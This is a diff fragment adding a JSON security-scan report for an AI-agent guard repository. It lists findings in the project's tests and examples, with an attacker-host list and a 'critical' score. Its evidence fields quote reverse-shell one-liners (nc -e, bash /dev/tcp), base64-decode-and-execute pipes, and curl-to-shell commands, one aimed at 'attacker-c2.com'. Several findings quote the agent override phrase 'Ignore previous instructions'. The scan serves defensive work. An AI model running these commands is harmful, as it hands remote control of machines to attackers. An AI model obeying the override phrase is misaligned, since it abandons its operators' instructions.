+      "file_sha256": "e0594c4921a177cc3c757fb6f81146e3131988d7325ef174412ce0a37b6762b8"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/tests/adversarial_bypass_challenge.js",
+      "line": 134,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "439b78865cf8db5001491a093e64a6a30b985668036bb648fe3b05fd4eb43cd0"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/tests/test_agent_discovery_and_enforcement.js",
+      "line": 211,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "3ac91574d41fca812abe4566e80b5b411ee7b17eed7452ce1631233398125db0"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/tests/test_agent_discovery_and_enforcement.js",
+      "line": 131,
+      "evidence": "nc -e /bin/bash",
+      "file_sha256": "3ac91574d41fca812abe4566e80b5b411ee7b17eed7452ce1631233398125db0"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/tests/test_v27_swarm_consensus.py",
+      "line": 94,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "1b1012f47a51c2c0fade72f8396444e464e3b543528ff576cf758e6ecf884cc7"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/tests/test_universal_compatibility.js",
+      "line": 110,
+      "evidence": "base64 -d | base64 -d | sh",
+      "file_sha256": "1df71e4c7d87431e2aef244a3b2020ca56e2e06d4292e5f58b46373419f1e82e"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/tests/benchmark_concurrency_stress.js",
+      "line": 22,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "77519954002d4b6b4b87c93e1d67b5733ba7d37a594ba3866614834b38c732e5"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/tests/benchmark_concurrency_stress.js",
+      "line": 24,
+      "evidence": "nc -e /bin/sh",
+      "file_sha256": "77519954002d4b6b4b87c93e1d67b5733ba7d37a594ba3866614834b38c732e5"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/tests/enforcement/test_boundary_enforcement_harness.js",
+      "line": 74,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "80e3cf94acf54a30c7fa8bb4a50c87da2994ff17ec13c58fc6584c4f20d65896"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/tests/test_sidecar_proxy.py",
+      "line": 31,
+      "evidence": "bash -i >& /dev/tcp/",
+      "file_sha256": "65f6bbbff19c341c427feec919cc7c855ddb11f6a7a2a4af7f7b5e1a5c53679d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/images/keystone_passkey_core.svg",
+      "line": 85,
+      "evidence": "curl | sh",
+      "file_sha256": "e6c7fe236f33632bad47597fe4cda471fdf1ec7ebd4d8710a14e062159aab918"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/examples/04_nvidia_nim_llama3_guard.py",
+      "line": 33,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "cf4336d635606fbf0b25ca9478e25e9278bf5472559a9034cba18429bb2677f4"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/examples/web_showcase_visualizer/index.html",
+      "line": 619,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "baff83a76dfc3e63bd3778834f85baf3af7964334b4174f92ea06c7b04975937"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/examples/langchain_agent_guard.py",
+      "line": 66,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "a1ef775def6408ebfb50c01ed53f1ec776ab2ab55fb36fa1cbe19bd50c085fba"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/examples/live_interactive_defense_demo.js",
+      "line": 106,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "bb82dc7ea5f16e0de0cf6b241fddaa6a750165dab5563adac2234d42b4b6d44c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/examples/03_langgraph_safe_workflow.py",
+      "line": 33,
+      "evidence": "curl -s http://unverified-third-party.io/script.sh | bash",
+      "file_sha256": "edc49b4fa973e7c2f681096116247153d8faef8f93a87ab31262e43f49a18107"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/examples/06_claude_code_sentinel.py",
+      "line": 42,
+      "evidence": "curl -s http://attacker-c2.com/payload.sh | sh",
+      "file_sha256": "c64ce7ba2212ae59fbeb868cc709be3c20d655ef564483e0129f18af9a9d57a9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/examples/demo_universal_grok_fintech.py",
+      "line": 52,
+      "evidence": "Ignore prior instructions",
+      "file_sha256": "6252cef5844fe71bef98d48d8ec6094424129d80d5dd169f1e3e2dece4c4ce3c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/examples/being_built/anthropic_computer_use_guard.py",
+      "line": 12,
+      "evidence": "curl | bash",
+      "file_sha256": "b2ce63f678c6efd0d3aa4db15a8ceec3b2edc3f8d0b66c37878454cfabfb2807"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/examples/being_built/gemini_function_calling_guard.py",
+      "line": 12,
+      "evidence": "curl | bash",
+      "file_sha256": "ca9246edd1c6815d456d60ecf8cb9315ebe0628906d279be6abbc06f87996ca6"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/examples/palantir_aip_ontology_guard.py",
+      "line": 83,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "497992e83a60ba08523d56e44aeeea2ec99cc9f2e1c95d41c35ac4ee3405bbb2"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "127.0.0.1",
+    "169.254.169.254",
+    "35.222.210.105",
+    "35.255.62.200",
+    "acn-26670.web.app",
+    "acn-fastapi-backend-322603900775.us-central1.run.app",
+    "acn-network.org",
+    "anthropic.com",
+    "api.anthropic.com",
+    "api.bartholomew.info",
+    "api.datadoghq.com",
+    "api.example.com",
+    "api.healthcorp.internal",
+    "api.npmjs.org",
+    "api.openai.com",
+    "api.osv.dev",
+    "api.service.internal",
+    "api.stripe.com",
+    "api.x.ai",
+    "app.bartholomew.info",
+    "app.slack.com",
+    "arxiv.org",
+    "attacker.com",
+    "attacker.io",
+    "attacker.xyz",
+    "auth.bartholomew.network",
+    "bartholomew-metered-mcp-322603900775.us-central1.run.app",
+    "bartholomew.info",
+    "bartolomew-cloud-engine-322603900775.us-central1.run.app",
+    "btp-liaison-fleet-322603900775.us-central1.run.app",
+    "bughunters.google.com",
+    "buy.stripe.com",
+    "c2-malicious-server.io",
+    "cdn.midjourney.com",
+    "checkout.stripe.com",
+    "csrc.nist.gov",
+    "deepmind.google",
+    "discord.com",
+    "doi.org",
+    "dotenvx.com",
+    "ebpf.io",
+    "events.pagerduty.com",
+    "evil-c2.example.com",
+    "evil.com",
+    "example.com",
+    "feross.org",
+    "fiverr.com",
+    "fonts.googleapis.com",
+    "fonts.gstatic.com",
+    "github.com",
+    "glama.ai",
+    "hooks.slack.com",
+    "huggingface.co",
+    "img.shields.io",
+    "json-schema.org",
+    "linkedin.com",
+    "malicious-listener.xyz",
+    "malicious.cc",
+    "malicious.evil",
+    "mcpmarket.com",
+    "meet.google.com",
+    "metadata.google.internal",
+    "modelcontextprotocol.io",
+    "node1.example.com",
+    "node2.example.com",
+    "open-vsx.org",
+    "openai.com",
+    "opencollective.com",
+    "opensource.org",
+    "openssf.org",
+    "pagead2.googlesyndication.com",
+    "paulmillr.com",
+    "paypal.me",
+    "promptarmor.com",
+    "pypi.org",
+    "pypistats.org",
+    "python.org",
+    "raw.githubusercontent.com",
+    "reddit.com",
+    "registry.npmjs.org",
+    "rostova.dev",
+    "schema.org",
+    "securitylab.github.com",
+    "smithery.ai",
+    "teams.live.com",
+    "trusted.org",
+    "twitter.com",
+    "untrusted-agent-relay.xyz",
+    "www.apache.org",
+    "www.aporia.com",
+    "www.bartholomew.info",
+    "www.buymeacoffee.com",
+    "www.lakera.ai",
+    "www.linkedin.com",
+    "www.linuxfoundation.org",
+    "www.npmjs.com",
+    "www.patreon.com",
+    "www.rfc-editor.org",
+    "www.sitemaps.org",
+    "www.w3.org"
+  ],
+  "install_script": false,
+  "score": "critical"
+}
